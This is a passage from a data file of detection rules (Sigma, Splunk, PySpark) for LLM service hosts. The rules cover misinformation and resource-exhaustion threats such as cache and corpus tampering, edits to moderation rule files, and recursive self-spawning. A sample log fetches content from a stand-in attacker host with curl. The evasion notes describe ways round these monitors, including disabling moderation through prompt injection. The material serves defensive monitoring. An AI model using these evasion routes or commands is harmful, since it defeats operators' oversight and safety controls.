      AND (target_filename LIKE '%/responses/%' OR target_filename LIKE '%/answer-cache/%' OR target_filename LIKE '%/generated/%')
      AND target_filename NOT LIKE '%/opt/llm/responses/%'
      AND target_filename NOT LIKE '%/srv/llm/responses/%'
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T10:22:11Z","computer_name":"llm-host-01","user":"llm_svc","image":"/opt/llm/app/cache_writer.py","target_filename":"/tmp/responses/answer_001.json","event_type":"file_create"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "LLM services writing debug response logs during development",
    ],
    tuningGuidance:
      "Establish an explicit allowlist of approved response cache paths. Any write outside this list warrants review, as cached responses can be served to future users.",
    deploymentNotes:
      "Response caches written to unexpected paths may also indicate the service is operating in an unintended mode. Correlate with application logs to verify cache configuration.",
    evasionConsiderations:
      "Attacker may inject misinformation into the cache via the application's own cache API rather than direct file writes.",
    problemStatement:
      "Response caches allow LLM services to serve pre-computed answers. Writing manipulated responses to cache paths causes subsequent users to receive attacker-controlled misinformation without the model ever processing their query.",
  },
  {
    id: "llm09-002",
    title: "LLM Service Updating Policy Or Moderation Rules Before Serving",
    description:
      "Detects LLM service processes writing to moderation, policy, safety rule, or response filter files. Runtime modification of these controls can disable safety guardrails, enabling the model to produce harmful or misleading outputs.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1562.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "misinformation", "linux", "policy-tamper", "owasp-llm09"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Updating Policy Or Moderation Rules Immediately Before Serving
owasp top 10: LLM09:2025 Misinformation
id: 5fba6ef3-372c-4539-a414-9d37488be1ec
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
  selection_file:
    TargetFilename|contains:
      - moderation
      - policy
      - safety_rules
      - response_filter
  condition: selection_proc and selection_file
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: medium
tags:
  - attack.defense-evasion
  - ai.llm
  - llm09.misinformation`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*moderation*" OR target_filename="*safety_rules*" OR target_filename="*response_filter*")
  NOT event_type="read"
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm09-002' AS detection_id,
           'LLM Service Updating Policy Or Moderation Rules Before Serving' AS detection_name,
           'medium' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%moderation%'
        OR target_filename LIKE '%safety_rules%'
        OR target_filename LIKE '%response_filter%')
      AND event_type != 'read'
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T11:08:30Z","computer_name":"llm-host-02","user":"llm_svc","image":"/opt/llm/app/config_updater.py","target_filename":"/opt/llm/config/moderation_rules.yaml","event_type":"file_modify"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "Legitimate moderation rule updates deployed via the approved configuration management pipeline",
    ],
    tuningGuidance:
      "Moderation and safety rule files should be treated as immutable during serving. Alert on any write outside a defined maintenance window.",
    deploymentNotes:
      "Apply file integrity monitoring to all safety and moderation configuration files. Changes should require a deployment pipeline rather than in-place edits.",
    evasionConsiderations:
      "Attacker may disable moderation by manipulating the in-memory rule object via prompt injection rather than modifying the rule files on disk.",
    problemStatement:
      "Moderation and safety rules are the last line of defense against harmful LLM outputs. Runtime modification of these files effectively disables safety controls, allowing the model to produce content it would otherwise refuse.",
  },
  {
    id: "llm09-003",
    title: "LLM Service Pulling External Content For Response Enrichment",
    description:
      "Detects LLM service processes spawning curl or wget during request handling. Fetching external content for response enrichment introduces an uncontrolled information source that may inject false, attacker-controlled, or outdated facts into model responses.",
    platform: ["Linux", "AI/ML", "Network"],
    mitre: ["T1005"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "misinformation", "linux", "network", "owasp-llm09"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Pulling External Content For Response Enrichment
owasp top 10: LLM09:2025 Misinformation
id: ee3253f9-851e-494b-828e-c7c5a3cc2d27
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
  selection_child:
    Image|endswith:
      - /curl
      - /wget
  condition: selection_parent and selection_child
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
  - ComputerName
level: medium
tags:
  - attack.collection
  - ai.llm
  - llm09.misinformation`,
    splunk: `index=linux_audit sourcetype=auditd_process
  parent_image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  image IN ("*/curl", "*/wget")
| table _time, computer_name, user, image, command_line, parent_image
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line, parent_image,
           'llm09-003' AS detection_id,
           'LLM Service Pulling External Content For Response Enrichment' AS detection_name,
           'medium' AS severity
    FROM linux_audit_events
    WHERE (parent_image LIKE '%/opt/llm/%' OR parent_image LIKE '%/srv/llm/%' OR parent_image LIKE '%/app/llm/%')
      AND (image LIKE '%/curl' OR image LIKE '%/wget')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T15:14:07Z","computer_name":"llm-host-03","user":"llm_svc","image":"/usr/bin/curl","command_line":"curl -s https://news-source.attacker.com/feed.json","parent_image":"/opt/llm/app/response_enricher.py"}`,
    ],
    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
    falsePositives: [
      "Approved tool-use integrations that fetch external data from verified sources as part of the LLM workflow",
    ],
    tuningGuidance:
      "Maintain an allowlist of approved external content sources. Alert on any curl/wget targeting unrecognised domains during request handling.",
    deploymentNotes:
      "Implement a URL allowlist proxy for LLM services that fetch external content. This provides both detection and prevention.",
    evasionConsiderations:
      "Attacker may control a URL that appears benign but serves manipulated content to inject misinformation into the LLM response.",
    problemStatement:
      "LLM services that fetch external content during response generation introduce an unverified information source. Attacker-controlled content fetched during enrichment can cause the model to confidently present false information as fact.",
  },
  {
    id: "llm09-004",
    title: "LLM Service Replacing Retrieval Corpus Files",
    description:
      "Detects LLM service processes writing to knowledge base, corpus, or RAG document index directories. Replacement of the retrieval corpus is a direct mechanism for injecting misinformation into RAG-grounded LLM responses.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1565.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "misinformation", "linux", "corpus-replace", "owasp-llm09"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Replacing Retrieval Corpus Files
owasp top 10: LLM09:2025 Misinformation
id: bce4d2bb-b17c-4d12-b352-78461623cb23
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
  selection_target:
    TargetFilename|contains:
      - /corpus/
      - /knowledge/
      - /rag/
      - /docs-index/
  condition: selection_proc and selection_target
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: high
tags:
  - attack.impact
  - ai.llm
  - llm09.misinformation`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*/corpus/*" OR target_filename="*/knowledge/*" OR target_filename="*/rag/*" OR target_filename="*/docs-index/*")
  NOT event_type="read"
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm09-004' AS detection_id,
           'LLM Service Replacing Retrieval Corpus Files' AS detection_name,
           'high' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%/corpus/%'
        OR target_filename LIKE '%/knowledge/%'
        OR target_filename LIKE '%/rag/%'
        OR target_filename LIKE '%/docs-index/%')
      AND event_type != 'read'
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T04:55:20Z","computer_name":"llm-host-01","user":"llm_svc","image":"/opt/llm/app/corpus_updater.py","target_filename":"/opt/llm/rag/knowledge/company_policy.txt","event_type":"file_modify"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "Approved knowledge base update pipelines that refresh RAG document stores",
    ],
    tuningGuidance:
      "Corpus updates should follow a controlled pipeline with content validation and review. Alert on any write outside an approved deployment window or service account.",
    deploymentNotes:
      "Implement content validation and hashing for corpus documents. Any corpus change should trigger a review before the updated index goes live.",
    evasionConsiderations:
      "Attacker may inject misinformation via the document ingestion API rather than direct file writes, bypassing file-based detection.",
    problemStatement:
      "The retrieval corpus is the knowledge source that grounds RAG model responses. Replacing or modifying corpus files allows an attacker to inject false facts that the model will confidently cite as retrieved evidence.",
  },
  {
    id: "llm09-005",
    title: "LLM Service Uploading Generated Content To OCI Object Storage",
    description:
      "Detects LLM service processes using the OCI CLI to upload response, answer, summary, or report files to object storage. Publishing model-generated content to shared storage may distribute misinformation or attacker-influenced outputs at scale.",
    platform: ["Linux", "AI/ML", "OCI"],
    mitre: ["T1048.002"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "misinformation", "linux", "oci", "owasp-llm09"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Uploading Generated Content To OCI Object Storage
owasp top 10: LLM09:2025 Misinformation
id: b254843c-c5e2-4436-ace5-69426b28d455
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
  selection_child:
    Image|endswith:
      - /oci
  selection_cmd:
    CommandLine|contains:
      - object put
      - os object put
      - bucket
  selection_hint:
    CommandLine|contains:
      - response
      - answer
      - summary
      - report
  condition: selection_parent and selection_child and selection_cmd and selection_hint
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
  - ComputerName
level: medium
tags:
  - attack.exfiltration
  - ai.llm
  - llm09.misinformation`,
    splunk: `index=linux_audit sourcetype=auditd_process
  parent_image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  image="*/oci"
  (command_line="*object put*" OR command_line="*os object put*")
  (command_line="*response*" OR command_line="*answer*" OR command_line="*summary*" OR command_line="*report*")
| table _time, computer_name, user, image, command_line, parent_image
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line, parent_image,
           'llm09-005' AS detection_id,
           'LLM Service Uploading Generated Content To OCI Object Storage' AS detection_name,
           'medium' AS severity
    FROM linux_audit_events
    WHERE (parent_image LIKE '%/opt/llm/%' OR parent_image LIKE '%/srv/llm/%' OR parent_image LIKE '%/app/llm/%')
      AND image LIKE '%/oci'
      AND (command_line LIKE '%object put%' OR command_line LIKE '%os object put%')
      AND (command_line LIKE '%response%' OR command_line LIKE '%answer%' OR command_line LIKE '%summary%' OR command_line LIKE '%report%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T18:47:33Z","computer_name":"llm-host-02","user":"llm_svc","image":"/usr/local/bin/oci","command_line":"oci os object put --bucket-name shared-reports --name generated_summary_20250115.txt --file /opt/llm/output/summary.txt","parent_image":"/opt/llm/app/report_publisher.py"}`,
    ],
    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
    falsePositives: [
      "Approved LLM report generation pipelines that publish outputs to designated OCI buckets",
    ],
    tuningGuidance:
      "Baseline the approved bucket names and naming conventions for LLM output publishing. Alert on uploads to any bucket outside this approved list.",
    deploymentNotes:
      "Use OCI bucket policies to restrict write access to designated output buckets. Review bucket access permissions to prevent unintended public exposure of generated content.",
    evasionConsiderations:
      "Attacker may embed misinformation in content uploaded through an approved pipeline, bypassing destination-based detection.",
    problemStatement:
      "Uploading model-generated content to object storage can propagate attacker-influenced misinformation to downstream consumers of that storage bucket, multiplying the impact of a single compromised inference.",
  },

  // ── LLM10: Unbounded Consumption ─────────────────────────────────────────
  {
    id: "llm10-001",
    title: "LLM Service Excessive Child Process Creation",
    description:
      "Detects unusually high rates of child process creation from LLM service processes. Excessive process spawning may indicate an unbounded consumption attack where the model is being directed to execute repeated tasks, consuming host resources.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1499.004"],
    category: "AI Security",
    maturity: "experimental",
    severity: "low",
    tags: ["llm", "unbounded-consumption", "linux", "dos", "owasp-llm10"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Excessive Child Process Creation Seed
owasp top 10: LLM10:2025 Unbounded Consumption
id: 3561fc32-c59d-4854-8cd6-d3646aac34d9
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  condition: selection_parent
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
  - ComputerName
level: low
tags:
  - attack.impact
  - ai.llm
  - llm10.unbounded-consumption`,
    splunk: `index=linux_audit sourcetype=auditd_process
  parent_image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
| bucket _time span=1m
| stats count AS proc_count BY _time, computer_name, parent_image
| where proc_count > 50
| sort -proc_count`,
    pyspark: `result = spark.sql("""
    SELECT
      date_trunc('minute', timestamp) AS minute_bucket,
      computer_name AS host, parent_image,
      COUNT(*) AS process_count,
      'llm10-001' AS detection_id,
      'LLM Service Excessive Child Process Creation' AS detection_name,
      'low' AS severity
    FROM linux_audit_events
    WHERE parent_image LIKE '%/opt/llm/%'
       OR parent_image LIKE '%/srv/llm/%'
       OR parent_image LIKE '%/app/llm/%'
    GROUP BY date_trunc('minute', timestamp), computer_name, parent_image
    HAVING COUNT(*) > 50
    ORDER BY process_count DESC
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T09:01:00Z","computer_name":"llm-host-01","user":"llm_svc","image":"/bin/sh","command_line":"sh -c echo test","parent_image":"/opt/llm/app/task_runner.py","count_in_window":157}`,
    ],
    requiredFields: ["parent_image", "image", "user", "computer_name"],
    falsePositives: [
      "Legitimate batch processing workflows that spawn many short-lived child processes",
    ],
    tuningGuidance:
      "Establish a baseline for normal child process rates for the LLM service during peak load. Alert on rates significantly above this baseline (e.g. 3x normal).",
    deploymentNotes:
      "Use rate-based alerting aggregated over 1-minute windows. Raw per-event alerting will generate excessive noise for this rule.",
    evasionConsiderations:
      "Attacker may use thread-level parallelism within the LLM process rather than spawning child processes, evading process-spawn based rate detection.",
    problemStatement:
      "Unbounded consumption attacks exhaust host resources by directing the LLM to spawn excessive processes. This can degrade service availability for legitimate users and mask other malicious activities occurring under resource contention.",
  },
  {
    id: "llm10-002",
    title: "LLM Service Repeated External Network Connections",
    description:
      "Detects high rates of outbound network connections from LLM service processes. A flood of connections may indicate the model is executing repeated external API calls, data exfiltration loops, or C2 beaconing triggered by an unbounded consumption attack.",
    platform: ["Linux", "AI/ML", "Network"],
    mitre: ["T1499.002"],
    category: "AI Security",
    maturity: "experimental",
    severity: "low",
    tags: ["llm", "unbounded-consumption", "linux", "network", "owasp-llm10"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Repeated External Connections Seed
owasp top 10: LLM10:2025 Unbounded Consumption
id: c433b85d-ddb4-44d3-97b6-68b6d7a03ca3
status: experimental
logsource:
  category: network_connection
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  condition: selection_proc
fields:
  - Image
  - DestinationHostname
  - DestinationIp
  - DestinationPort
  - User
  - ComputerName
level: low
tags:
  - attack.impact
  - ai.llm
  - llm10.unbounded-consumption`,
    splunk: `index=linux_network sourcetype=network_connection
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
| bucket _time span=1m
| stats count AS conn_count, dc(dest_hostname) AS unique_dests BY _time, computer_name, image
| where conn_count > 100
| sort -conn_count`,
    pyspark: `result = spark.sql("""
    SELECT
      date_trunc('minute', timestamp) AS minute_bucket,
      computer_name AS host, image,
      COUNT(*) AS connection_count,
      COUNT(DISTINCT destination_hostname) AS unique_destinations,
      'llm10-002' AS detection_id,
      'LLM Service Repeated External Network Connections' AS detection_name,
      'low' AS severity
    FROM linux_network_events
    WHERE image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%'
    GROUP BY date_trunc('minute', timestamp), computer_name, image
    HAVING COUNT(*) > 100
    ORDER BY connection_count DESC
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T12:01:00Z","computer_name":"llm-host-02","user":"llm_svc","image":"/opt/llm/app/api_client.py","destination_hostname":"external-api.example.com","connection_count_per_minute":312}`,
    ],
    requiredFields: ["image", "destination_hostname", "destination_ip", "user", "computer_name"],
    falsePositives: [
      "High-throughput LLM services making many legitimate API calls to approved backends",
    ],
    tuningGuidance:
      "Set the threshold based on observed peak connection rates for normal workloads. Focus alerts on connections to new or unrecognised destinations.",
    deploymentNotes:
      "Rate-based detection requires time-window aggregation. Correlate connection rate spikes with CPU/memory metrics for confirmation.",
    evasionConsiderations:
      "Attacker may use connection pooling and keep-alive to make many logical requests over few connections, evading connection-count-based detection.",
    problemStatement:
      "A flood of outbound connections from an LLM service indicates unbounded consumption that can exhaust network resources and API rate limits, while also potentially indicating data exfiltration via repeated small transfers.",
  },
  {
    id: "llm10-003",
    title: "LLM Service Rapid Writes To Cache Or Temp Directories",
    description:
      "Detects high rates of file writes from LLM service processes to cache or temporary directories. Rapid writes may indicate an unbounded consumption attack that is flooding the disk, potentially causing storage exhaustion or degrading host performance.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1499.004"],
    category: "AI Security",
    maturity: "experimental",
    severity: "low",
    tags: ["llm", "unbounded-consumption", "linux", "file-write", "owasp-llm10"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Rapid Writes To Cache Or Temp Directories Seed
owasp top 10: LLM10:2025 Unbounded Consumption
id: 306459f3-6593-42d8-ba7a-7ba98a12a257
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_path:
    TargetFilename|contains:
      - /tmp/
      - /var/tmp/
      - /cache/
      - /dev/shm/
  condition: selection_proc and selection_path
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: low
tags:
  - attack.impact
  - ai.llm
  - llm10.unbounded-consumption`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*/tmp/*" OR target_filename="*/var/tmp/*" OR target_filename="*/cache/*" OR target_filename="*/dev/shm/*")
| bucket _time span=1m
| stats count AS write_count BY _time, computer_name, image
| where write_count > 200
| sort -write_count`,
    pyspark: `result = spark.sql("""
    SELECT
      date_trunc('minute', timestamp) AS minute_bucket,
      computer_name AS host, image,
      COUNT(*) AS write_count,
      'llm10-003' AS detection_id,
      'LLM Service Rapid Writes To Cache Or Temp Directories' AS detection_name,
      'low' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%/tmp/%' OR target_filename LIKE '%/var/tmp/%'
        OR target_filename LIKE '%/cache/%' OR target_filename LIKE '%/dev/shm/%')
    GROUP BY date_trunc('minute', timestamp), computer_name, image
    HAVING COUNT(*) > 200
    ORDER BY write_count DESC
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T14:01:00Z","computer_name":"llm-host-03","user":"llm_svc","image":"/opt/llm/app/cache_manager.py","target_filename":"/tmp/llm_cache_item_00847.json","write_count_per_minute":483}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "High-throughput LLM services with aggressive caching strategies",
    ],
    tuningGuidance:
      "Baseline normal write rates per workload tier. Alert on rates exceeding 3x peak normal. Correlate with disk usage metrics.",
    deploymentNotes:
      "Implement disk quotas on /tmp and cache directories for the LLM service account to provide a preventive control alongside this detection.",
    evasionConsiderations:
      "Attacker may consume disk by writing large files rather than many small files, achieving exhaustion under a lower write count threshold.",
    problemStatement:
      "Rapid file writes to temporary or cache directories from an LLM service indicate disk exhaustion attacks that can cause service failures, cascade to dependent systems, and mask higher-severity concurrent attack activity.",
  },
  {
    id: "llm10-004",
    title: "LLM Service Launching Multiple OCI CLI Commands",
    description:
      "Detects high rates of OCI CLI invocations from LLM service processes within a short time window. Repeated OCI CLI calls may indicate the model is executing unbounded cloud API operations, consuming OCI API quotas or generating unexpected cloud costs.",
    platform: ["Linux", "AI/ML", "OCI"],
    mitre: ["T1499.004"],
    category: "AI Security",
    maturity: "experimental",
    severity: "low",
    tags: ["llm", "unbounded-consumption", "linux", "oci", "owasp-llm10"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Launching Multiple OCI CLI Commands Seed
owasp top 10: LLM10:2025 Unbounded Consumption
id: f2caaf23-8066-4ce2-a8d6-80b551886758
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_child:
    Image|endswith:
      - /oci
  condition: selection_parent and selection_child
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
  - ComputerName
level: low
tags:
  - attack.impact
  - ai.llm
  - llm10.unbounded-consumption`,
    splunk: `index=linux_audit sourcetype=auditd_process
  parent_image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  image="*/oci"
| bucket _time span=5m
| stats count AS oci_invocations, values(command_line) AS commands BY _time, computer_name, parent_image
| where oci_invocations > 20
| sort -oci_invocations`,
    pyspark: `result = spark.sql("""
    SELECT
      date_trunc('minute', timestamp) AS five_min_bucket,
      computer_name AS host, parent_image,
      COUNT(*) AS oci_invocation_count,
      collect_list(command_line) AS commands,
      'llm10-004' AS detection_id,
      'LLM Service Launching Multiple OCI CLI Commands' AS detection_name,
      'low' AS severity
    FROM linux_audit_events
    WHERE image LIKE '%/oci'
      AND (parent_image LIKE '%/opt/llm/%' OR parent_image LIKE '%/srv/llm/%' OR parent_image LIKE '%/app/llm/%')
    GROUP BY date_trunc('minute', timestamp), computer_name, parent_image
    HAVING COUNT(*) > 20
    ORDER BY oci_invocation_count DESC
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T16:05:00Z","computer_name":"llm-host-01","user":"llm_svc","image":"/usr/local/bin/oci","command_line":"oci compute instance list","parent_image":"/opt/llm/app/infra_agent.py","oci_calls_per_5min":47}`,
    ],
    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
    falsePositives: [
      "Approved LLM infrastructure agents that legitimately make many OCI API calls",
    ],
    tuningGuidance:
      "Baseline expected OCI CLI invocation rates for approved agent workflows. Alert on rates exceeding the approved baseline, especially for destructive sub-commands.",
    deploymentNotes:
      "Implement OCI API rate limiting at the tenancy level and monitor OCI audit logs for quota exhaustion events alongside this host-based detection.",
    evasionConsiderations:
      "Attacker may use the OCI Python SDK directly to make API calls without spawning the CLI binary, evading process-based rate detection.",
    problemStatement:
      "An LLM directing unbounded OCI CLI calls can exhaust API rate quotas, trigger unexpected cloud costs, provision attacker-controlled resources, or perform reconnaissance at scale against the OCI tenancy.",
  },
  {
    id: "llm10-005",
    title: "LLM Service Recursive Self-Spawn",
    description:
      "Detects an LLM service process that is both the parent and child in a process creation event, indicating recursive self-spawning. This fork-bomb pattern can exhaust process table limits and system resources, causing a complete host denial of service.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1499.004"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "unbounded-consumption", "linux", "fork-bomb", "owasp-llm10"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Recursive Self Spawn
owasp top 10: LLM10:2025 Unbounded Consumption
id: 24e33822-6f06-4566-800e-89fec4be0b05
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
    ParentImage|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  condition: selection
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
  - ComputerName
level: high
tags:
  - attack.impact
  - ai.llm
  - llm10.unbounded-consumption`,
    splunk: `index=linux_audit sourcetype=auditd_process
  parent_image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
| table _time, computer_name, user, image, command_line, parent_image
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line, parent_image,
           'llm10-005' AS detection_id,
           'LLM Service Recursive Self-Spawn' AS detection_name,
           'high' AS severity
    FROM linux_audit_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (parent_image LIKE '%/opt/llm/%' OR parent_image LIKE '%/srv/llm/%' OR parent_image LIKE '%/app/llm/%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T22:55:01Z","computer_name":"llm-host-02","user":"llm_svc","image":"/opt/llm/app/worker.py","command_line":"python3 /opt/llm/app/worker.py --task recurse","parent_image":"/opt/llm/app/worker.py"}`,
    ],
    requiredFields: ["image", "parent_image", "command_line", "user", "computer_name"],
    falsePositives: [
      "Legitimate multi-process LLM worker pools where worker processes spawn sub-workers",
    ],
    tuningGuidance:
      "Limit to cases where the same executable path appears as both Image and ParentImage. Exclude known worker pool manager processes.",
    deploymentNotes:
      "Implement ulimit -u (max user processes) for the LLM service account as a preventive control. Alert should trigger an immediate auto-remediation action to kill the process tree.",
    evasionConsiderations:
      "Attacker may orchestrate the recursive spawn via slightly different binary paths or wrapper scripts to avoid exact path matching.",
    problemStatement:
      "An LLM service that spawns copies of itself recursively creates an exponential process growth pattern that exhausts the process table, memory, and CPU, causing a complete host denial of service within seconds.",
  },
];
